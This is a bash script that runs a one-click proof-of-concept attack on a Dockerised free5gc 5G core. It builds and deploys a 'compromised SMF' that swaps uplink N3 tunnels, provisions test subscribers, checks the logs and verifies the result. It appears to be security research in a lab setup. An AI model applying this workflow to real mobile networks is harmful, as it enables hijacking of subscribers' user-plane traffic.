#!/bin/bash
# ============================================================================
# run_attack.sh — One-Click Compromised SMF Attack Demo
# ============================================================================
#
# This script runs the complete attack from start to finish:
#   1. Builds the compromised SMF Docker image
#   2. Tears down any existing deployment
#   3. Launches the attack topology (2 UPFs, 2 UEs)
#   4. Provisions subscribers
#   5. Waits for PDU sessions
#   6. Runs verification
#
# Usage:
#   cd free5gc-compose
#   ./attack_poc/run_attack.sh
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPOSE_DIR="${SCRIPT_DIR}/.."

cd "${COMPOSE_DIR}"

echo "╔══════════════════════════════════════════════════╗"
echo "║  Compromised SMF — UL N3 Tunnel Swap Attack     ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# ─── Step 1: Build ───
echo "━━━ Step 1/6: Building compromised SMF image ━━━"
./attack_poc/build_compromised_smf.sh
echo ""

# ─── Step 2: Tear down ───
echo "━━━ Step 2/6: Tearing down existing deployment ━━━"
docker-compose down -v 2>/dev/null || true
docker-compose -f attack_poc/docker-compose-attack.yaml down -v 2>/dev/null || true
echo ""

# ─── Step 3: Launch ───
echo "━━━ Step 3/6: Launching attack topology ━━━"
docker-compose -f attack_poc/docker-compose-attack.yaml up -d
echo ""

# ─── Step 4: Provision ───
echo "━━━ Step 4/6: Waiting for MongoDB (20s) then provisioning ━━━"
sleep 20
./attack_poc/provision_subscribers.sh
echo ""

# ─── Step 5: Wait for sessions ───
echo "━━━ Step 5/6: Waiting for UE registration & PDU sessions (30s) ━━━"
sleep 30

echo "SMF Attack Logs:"
docker logs smf 2>&1 | grep -i "ATTACK" || echo "  (No attack markers yet)"
echo ""

echo "gNB Status:"
docker logs ueransim-gnb 2>&1 | tail -5
echo ""

echo "UE1 Status:"
docker logs ueransim-ue1 2>&1 | tail -5
echo ""

echo "UE2 Status:"
docker logs ueransim-ue2 2>&1 | tail -5
echo ""

# ─── Step 6: Verify ───
echo "━━━ Step 6/6: Running verification ━━━"
./attack_poc/verify_attack.sh
echo ""

echo "╔══════════════════════════════════════════════════╗"
echo "║  Attack demo complete!                           ║"
echo "║                                                  ║"
echo "║  To roll back: ./attack_poc/rollback.sh          ║"
echo "╚══════════════════════════════════════════════════╝"
